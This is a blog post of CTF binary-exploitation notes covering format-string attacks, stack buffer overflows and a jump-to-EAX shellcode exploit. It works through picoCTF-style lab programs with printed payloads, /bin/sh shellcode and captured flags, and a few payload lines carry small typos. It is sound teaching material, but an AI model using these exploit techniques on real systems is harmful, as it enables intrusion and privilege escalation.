---
layout: post
title: "Learning from CTF : Binary Exploitation"
date: 2014-11-09 20:42:01 +0000
comments: true
categories: 
---
This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF's.
<!-- more -->

<ol>
<li>
Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
<br>
{% img left /images/big-endian.png 250 250 %}
{% img right /images/little-endian.png 250 250 %}
</li>
<br><br><br><br><br><br><br><br><br>
<li>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.
<ul>
<li>Executable binary is running on whether x86 or x86-64. (uname -a)</li>
<li>Whether the binary is compiled for 32 bit or 64 bit (file binary_file)</li>
<li>Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE) can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
<li>Whether the stack of binary is executable is not can be found by readelf tool. IF Program header GNU_STACK has RWE flag, if it has E flag, it's executable.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. run gdb <program>, p &<variablename>. </li>
</ul>
</li>


<li>Format String Vulnerability:

<ul>
<li>Whatis: If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parame-
ters.
Example:
printf ("The magic number is: %d\n", 1911);</li>

<li>The behaviour of the format function is controlled by the format string. The
function retrieves the parameters requested by the format string from the
stack.
printf ("Number %d has no address, number %d has: %08x\n", i, a, &a);
From within the printf function the stack looks like:
```
stack top
. . .
<&a>
<a>
<i>
A
. . .
stack bottom
```</li>
<li>Crashing the Program: By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like: printf ("%s%s%s%s%s%s%s%s%s%s%s%s");
Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</li>
<li>Viewing the stack: how some parts of the stack memory by using a format string like this: printf ("%08x.%08x.%08x.%08x.%08x\n");
This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:
40012980.080628c4.bffff7a4.00000005.08059c04 This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards
the low addresses.</li>

<li>Viewing Memory at any location: It is possible to peek at memory locations different from the stack memory. To do this we have to get the format function to display memory from an address we can supply. This poses two problems to us: First, we have to find a format parameter which uses an address (by reference) as stack parameter and displays memory from there, and we have to supply that address. We are lucky in the first case, since the ‘%s’ parameter just does that, it displays memory — usually an ASCIIZ string — from a stack-supplied address. So the remaining problem is, how to get that address on the stack, into the right place.

Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. 2 The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:
printf ("AAA0AAA1_%08x.%08x.%08x.%08x.%08x");
The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string.
In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one.
Example:
address = 0x08480110
address (encoded as 32 bit le string): "\x10\x01\x48\x08" printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");
Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.
</li>

<li>Overwriting of Arbitrary Memory: There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) 
at the address: "\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n" The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter
written by ‘%n’, at least a bit. </li>

<li>Direct Parameter Access: The direct parameter access is controlled by the ‘$’ qualifier: printf ("%6$d\n", 6, 5, 4, 3, 2, 1); Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.
</li>
</ul>


Aanother example of picoctf 2014, best_shell can be read at <a href="https://ctf-team.vulnhub.com/picoctf-2014-best-shell/">Best shell</a>.

</li>
</ol>

###Examples
<ol>
<li>
For example, below you need the address of secret to write the new value 0x1337beef.
``` C
unsigned secret = 0xdeadbeef;

int main(int argc, char **argv){
    unsigned *ptr;
    unsigned value;
    char key[33];
    FILE *f;
    printf("Welcome! I will grant you one arbitrary write!\n");
    printf("Where do you want to write to? ");
    scanf("%p", &ptr);
    printf("Okay! What do you want to write there? ");
    scanf("%p", (void **)&value);
    printf("Writing %p to %p...\n", (void *)value, (void *)ptr);
    *ptr = value;
    printf("Value written!\n");
    if (secret == 0x1337beef){
        printf("Woah! You changed my secret!\n");
        printf("I guess this means you get a flag now...\n");

        f = fopen("flag.txt", "r");
        fgets(key, 32, f);
        fclose(f);
        puts(key);
        exit(0);
    }
    printf("My secret is still safe! Sorry.\n");
}
```
</li>

<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can't be printed as ASCII characters, you can use python to pass the input.
```
python -c ' print "A" * 16 + "\xc0\xde\xfa\xce"' or python -c ' print "A" * 16 + "\xce\xfa\xde\xc0"' based on the endianess of the system.
```
``` C
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    int secret = 0;
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```</li>

<li>Controlling the EIP:
In the below challenge, an attacker can use a buffer overflow to take control of the program's execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
<ul>
<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
</ul>
``` C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```</li>
<li> Execute Me:
If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
<ul>
<li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
</ul>

``` C
#include <stdio.h>
#include <stdlib.h>

int token = 0;

typedef void (*function_ptr)();

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    char buf[128];

    be_nice_to_people();

    read(0, buf, 128);

    ((function_ptr)buf)();
}
```</li>

<li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?

<ul>
<li>
From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call.  run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
</li>
<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:
</li>
<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode by kernelpanic.</li>
<li> As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
``` Python
import struct
code = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
jmpeax = struct.pack("<I",0x080483e7)
print "\x90"*51 + code + jmpeax

```
</ul>
``` C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *name){
    char buf[64];
    strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc > 1)
        vuln(argv[1]);
    return 0;
}
```</li>

</ol>

###Format String Examples
<ol>
<li>
In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.
``` C
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);

    if (secret == 1337){
        give_shell();
    }
    return 0;
}

```

Reading the address
``` plain
pico83515@shell:/home/format$ gdb -q format
Reading symbols from format...(no debugging symbols found)...done.
(gdb) p $secret
$1 = void
(gdb) p &secret
$2 = (<data variable, no debug info> *) 0x804a030 <secret>
```
Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.
``` plain
pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000
```
We see that the address is present on the stack at the seventh position.

Otherwise, we can put it on the stack by
``` plain
for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141
```
What this is doing is "Extracting particular stack content by "%$i\$x". As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
``` plain
or i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
Offset: 103:AAAA41410074
Offset: 104:AAAA31254141
```
So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.
``` plain
for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
Offset: 103:AAAA41414141
```
It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)
``` plain
pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
$ id
uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
$ ls
Makefile  flag.txt  format  format.c
$ cat flag.txt
who_thought_%n_was_a_good_idea?
```
Otherwise as the address at the seventh is already present on stack we can also do
``` plain
pico83515@shell:/home/format$ ./format "%1337u%7\$n"
```
We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic 
``` plain
./format %08x.%08x.%08x.%08x.%08x.%1292u%n
```
If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see "%08x." is of eight characters + 1 of "." or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.

</li>

<li>
In another example below,
``` C
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define BUFSIZE 256

void greet(int length){
    char buf[BUFSIZE];
    puts("What is your name?");
    read(0, buf, length);
    printf("Hello, %s\n!", buf);
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    int length;
    be_nice_to_people();

    puts("How long is your name?");
    scanf("%d", &length);

    if(length < BUFSIZE) //don't allow buffer overflow
        greet(length);
    else
        puts("Length was too long!");
}

```
This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there's any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
```
pico1139@shell:/home/no_overflow$ (echo -1; python -c 'print "A"*268+"\xd0\xd6\xff\xff"+"\x90"*200+" "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'; cat) | ./no_overflow
How long is your name?
What is your name?
Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...

id
uid=11066(pico1139) gid=1007(no_overflow) groups=1017(picogroup)
cat flag.txt
what_is_your_sign

```
</li>

<li>
In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string "not_the_flag.txt" as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
``` plain
(gdb) br *puts
Breakpoint 1 at 0x8048460
(gdb) run
Starting program: /home/what_the_flag/what_the_flag 

Breakpoint 1, 0xf7e81ee0 in puts () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/s 0x08048777
0x8048777:	"not_the_flag.txt"
(gdb) x/s 0x08048778
0x8048778:	"ot_the_flag.txt"
(gdb) x/s 0x08048770
0x8048770:	"le: %s"
(gdb) x/s 0x0804877C
0x804877c:	"he_flag.txt"
(gdb) x/s 0x0804877D
0x804877d:	"e_flag.txt"
(gdb) x/s 0x0804877E
0x804877e:	"_flag.txt"
(gdb) x/s 0x0804877F
0x804877f:	"flag.txt"

```

``` C
#include <stdlib.h>
#include <stdio.h>

struct message_data{
    char message[128];
    char password[16];
    char *file_name;
};

void read_file(char *buf, char *file_path, size_t len){
    FILE *file;
    if(file= fopen(file_path, "r")){
        fgets(buf, len, file);
        fclose(file);
    }else{
        sprintf(buf, "Cannot read file: %s", file_path);
    }
}

int main(int argc, char **argv){
    struct message_data data;
    data.file_name = "not_the_flag.txt";

    puts("Enter your password too see the message:");
    gets(data.password);

    if(!strcmp(data.password, "1337_P455W0RD")){
        read_file(data.message, data.file_name, sizeof(data.message));
        puts(data.message);
    }else{
        puts("Incorrect password!");
    }

    return 0;
}

```

So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual:

gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below).

So by using the following input, we can overwrite the file pointer and still provide the correct password:
```plain
1337_P455W0RD
1337_P455W0RD\0aa\x7f\x87\x04\x08
aa\x7f\x87\x04\x08
```
We use this in the command line to get the flag
``` plain
pico83515@shell:/home/what_the_flag$ printf "1337_P455W0RD\0bb\x7f\x87\x04\x08" | ./what_the_flag
Enter your password too see the message:
Congratulations! Here is the flag: who_needs_%eip

pico83515@shell:/home/what_the_flag$
```
</li>
</ol>
